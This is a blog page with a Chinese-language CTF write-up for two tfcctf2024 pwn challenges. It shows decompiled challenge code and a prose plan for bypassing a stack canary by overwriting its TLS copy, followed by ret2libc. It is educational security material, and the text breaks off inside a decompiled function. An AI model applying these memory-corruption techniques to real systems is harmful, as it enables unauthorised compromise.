<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>tfcctf2024 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="题目附件https://github.com/nyyyddddn/ctf/tree/main/tfcctf2024
pwnGUARD-THE-BYPASS程序的逻辑如下 这里GUARD也就是指canary
int __cdecl main(int argc, const char **argv, const char **envp)
&amp;#123;
  int v5; // [rsp+Ch] [rbp-14h] BYREF
  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  puts(&#34;Welcome! Press 1 to start the chall.&#34;);
  __isoc99_scanf(&#34;%d&#34;, &amp;amp;v5);
  if ( v5 != 1 )
  &amp;#123;
    puts(&#34;Bye!&#34;);
    exit(0);
  &amp;#125;
  len = get_len();
  pthread_create(&amp;amp;newthread, 0LL, game, 0LL);
  pthread_join(newthread, 0LL);
  return v7 - __readfsqword(0x28u);
&amp;#125;

unsigned __int64 __fastcall game(void *a1)
&amp;#123;
  __int64 buf[5]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(buf, 0, 32);
  getchar();
  read(0, buf, len);
  return v3 - __readfsqword(0x28u);
&amp;#125;

有canary 没有pie，修改寄存器的gadget也有
posix接口创建的线程 tls结构体离函数栈帧很近，可以覆盖tls中的canary去绕过canary然后打ret2libc，tls附近有一两个指针在程序执行的时候会往里面写数据，想到了一种很简单的方法，把game函数的canary和tls中的canary覆盖成指向bss的指针，直接一路写过去，就不需要管指针解引用段错误的问题了
vspm程序的逻辑
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
&amp;#123;
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_1289(a1, a2, a3);
  puts(&#34;Welcome to the Very Secure Password Manager!&#34;);
  puts(&#34;--------------------------------------------\n&#34;);
  puts(&#34;1. Save new password&#34;);
  puts(&#34;2. Check my passwords&#34;);
  puts(&#34;3. Delete credentials&#34;);
  puts(&#34;4. Exit&#34;);
  while ( 1 )
  &amp;#123;
    v3 = 0;
    printf(&#34;Input: &#34;);
    __isoc99_scanf(&#34;%d&#34;, &amp;amp;v3);
    getchar();
    if ( v3 &amp;lt;= 0 || v3 &gt; 4 )
      break;
    switch ( v3 )
    &amp;#123;
      case 4:
        exit_();
      case 3:
        delete_password();
        break;
      case 1:
        save_password();
        break;
      default:
        show_password();
        break;
    &amp;#125;
  &amp;#125;
  puts(&#34;Not a valid choice :(&#34;);
  exit(0);
&amp;#125;

unsigned __int64 save_password()
&amp;#123;
  unsigned int v1; // [rsp+8h] [rbp-68h] BYREF
  int i; // [rsp+Ch] [rbp-64h]
  __int64 v3; // [rsp+10h] [rbp-60h]
  __int64 v4; // [rsp+18h] [rbp-58h]
  __int64 v5; // [rsp+20h] [rbp-50h]
  __int64 v6; // [rsp+28h] [rbp-48h]
  __int64 v7; // [rsp+30h] [rbp-40h]
  __int64 v8; // [rsp+38h] [rbp-38h]
  __int64 v9; // [rsp+40h] [rbp-30h]
  __int64 v10; // [rsp+48h] [rbp-28h]
  __int64 v11; // [rsp+50h] [rbp-20h]
  __int64 v12; // [rsp+58h] [rbp-18h]
  unsigned __int64 v13; // [rsp+68h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  for ( i = 0; i &amp;lt;= 9 &amp;amp;&amp;amp; *((_QWORD *)&amp;amp;unk_4060 + 5 * i); ++i )
    ;
  if ( i == 10 )
  &amp;#123;
    puts(&#34;No more space to save passwords.&#34;);
    exit(0);
  &amp;#125;
  printf(&#34;\nSelect length: &#34;);
  v1 = 0;
  __isoc99_scanf(&#34;%d&#34;, &amp;amp;v1);
  getchar();
  if ( v1 &gt;= 0x79 )
  &amp;#123;
    puts(&#34;Sorry, not enough resources!&#34;);
    exit(0);
  &amp;#125;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0LL;
  v8 = 0LL;
  v9 = 0LL;
  v10 = 0LL;
  v11 = 0LL;
  v12 = 0LL;
  *((_QWORD *)&amp;amp;unk_4060 + 5 * i) = malloc((int)v1);
  printf(&#34;Enter credentials: &#34;);
  read(0, *((void **)&amp;amp;unk_4060 + 5 * i), (int)(v1 + 1));
  printf(&#34;Name of the credentials: &#34;);
  read(0, (char *)&amp;amp;unk_4060 + 40 * i + 8, (int)(v1 + 1));
  return __readfsqword(0x28u) ^ v13;
&amp;#125;

int show_password()
&amp;#123;
  __int64 v0; // rax
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i &amp;lt;= 9; ++i )
  &amp;#123;
    v0 = *((_QWORD *)&amp;amp;unk_4060 + 5 * i);
    if ( v0 )
      LODWORD(v0) = printf(
                      &#34;%d. %.*s --&gt; %s&#34;,
                      (unsigned int)i,
                      32,
                      (const char *)&amp;amp;unk_4060 + 40 * i + 8,
                      *((const char **)&amp;amp;unk_4060 + 5 * i));
  &amp;#125;
  return v0;
&amp;#125;

unsigned __int64 delete_password()
&amp;#123;
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  printf(&#34;Select index: &#34;);
  __isoc99_scanf(&#34;%d&#34;, &amp;amp;v1);
  getchar();
  if ( !*((_QWORD *)&amp;amp;unk_4060 + 5 * v1) )
  &amp;#123;
    puts(&#34;You can&#39;t delete a non-existent password.&#34;);
    exit(0);
  &amp;#125;
  free(*((void **)&amp;amp;unk_4060 + 5 * v1));
  *((_QWORD *)&amp;amp;unk_4060 + 5 * v1) = 0LL;
  memset((char *)&amp;amp;unk_4060 + 40 * v1 + 8, 0, 0x20uLL);
  return __readfsqword(0x28u) ^ v2;
&amp;#125;"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="tfcctf2024"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> tfcctf2024</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/tfcctf2024">https://github.com/nyyyddddn/ctf/tree/main/tfcctf2024</a></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="GUARD-THE-BYPASS"><a href="#GUARD-THE-BYPASS" class="headerlink" title="GUARD-THE-BYPASS"></a>GUARD-THE-BYPASS</h2><p>程序的逻辑如下 这里GUARD也就是指canary</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">int</span> __cdecl main<span class="token punctuation">(</span><span class="token builtin">int</span> argc<span class="token punctuation">,</span> const char <span class="token operator">**</span>argv<span class="token punctuation">,</span> const char <span class="token operator">**</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> v5<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>14h<span class="token punctuation">]</span> BYREF
  pthread_t newthread<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>10h<span class="token punctuation">]</span> BYREF
  unsigned __int64 v7<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

  v7 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  setup<span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Welcome! Press 1 to start the chall."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts<span class="token punctuation">(</span><span class="token string">"Bye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token builtin">len</span> <span class="token operator">=</span> get_len<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  pthread_create<span class="token punctuation">(</span><span class="token operator">&amp;</span>newthread<span class="token punctuation">,</span> 0LL<span class="token punctuation">,</span> game<span class="token punctuation">,</span> 0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  pthread_join<span class="token punctuation">(</span>newthread<span class="token punctuation">,</span> 0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v7 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 __fastcall game<span class="token punctuation">(</span>void <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 buf<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>30h<span class="token punctuation">]</span> BYREF
  unsigned __int64 v3<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>28h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

  v3 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  memset<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v3 <span class="token operator">-</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有canary 没有pie，修改寄存器的gadget也有</p>
<p>posix接口创建的线程 tls结构体离函数栈帧很近，可以覆盖tls中的canary去绕过canary然后打ret2libc，tls附近有一两个指针在程序执行的时候会往里面写数据，想到了一种很简单的方法，把game函数的canary和tls中的canary覆盖成指向bss的指针，直接一路写过去，就不需要管指针解引用段错误的问题了</p>
<h2 id="vspm"><a href="#vspm" class="headerlink" title="vspm"></a>vspm</h2><p>程序的逻辑</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">void __fastcall __noreturn main<span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> char <span class="token operator">**</span>a2<span class="token punctuation">,</span> char <span class="token operator">**</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> v3<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>Ch<span class="token punctuation">]</span> BYREF
  unsigned __int64 v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

  v4 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  sub_1289<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Welcome to the Very Secure Password Manager!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"--------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"1. Save new password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"2. Check my passwords"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"3. Delete credentials"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"4. Exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"Input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span> v3 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    switch <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
        exit_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>
        delete_password<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>
        save_password<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      default<span class="token punctuation">:</span>
        show_password<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Not a valid choice :("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 save_password<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  unsigned <span class="token builtin">int</span> v1<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>68h<span class="token punctuation">]</span> BYREF
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>64h<span class="token punctuation">]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>10h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>60h<span class="token punctuation">]</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>18h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>58h<span class="token punctuation">]</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>50h<span class="token punctuation">]</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>28h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>48h<span class="token punctuation">]</span>
  __int64 v7<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>30h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>40h<span class="token punctuation">]</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>38h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>38h<span class="token punctuation">]</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>40h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>30h<span class="token punctuation">]</span>
  __int64 v10<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>48h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>28h<span class="token punctuation">]</span>
  __int64 v11<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>50h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>20h<span class="token punctuation">]</span>
  __int64 v12<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>58h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>18h<span class="token punctuation">]</span>
  unsigned __int64 v13<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>68h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

  v13 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts<span class="token punctuation">(</span><span class="token string">"No more space to save passwords."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  printf<span class="token punctuation">(</span><span class="token string">"\nSelect length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">>=</span> <span class="token number">0x79</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    puts<span class="token punctuation">(</span><span class="token string">"Sorry, not enough resources!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v3 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v7 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  v12 <span class="token operator">=</span> 0LL<span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> malloc<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  printf<span class="token punctuation">(</span><span class="token string">"Enter credentials: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>void <span class="token operator">**</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  printf<span class="token punctuation">(</span><span class="token string">"Name of the credentials: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span> <span class="token operator">^</span> v13<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token builtin">int</span> show_password<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v0<span class="token punctuation">;</span> <span class="token operator">//</span> rax
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v0 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token punctuation">)</span>
      LODWORD<span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> printf<span class="token punctuation">(</span>
                      <span class="token string">"%d. %.*s --> %s"</span><span class="token punctuation">,</span>
                      <span class="token punctuation">(</span>unsigned <span class="token builtin">int</span><span class="token punctuation">)</span>i<span class="token punctuation">,</span>
                      <span class="token number">32</span><span class="token punctuation">,</span>
                      <span class="token punctuation">(</span>const char <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span>
                      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>const char <span class="token operator">**</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_4060 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> v0<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

unsigned __int64 delete_password<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token builtin">int</span> v1<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>4h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>Ch<span class="token punctuation">]</span> BYREF
  unsigned __int64 v2<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>8h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>8h<span class="token punctuation">]</span>

  v2 <span class="token operator">=</span> __readfsqword<span class="token punctuation">(</span>0x28u<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
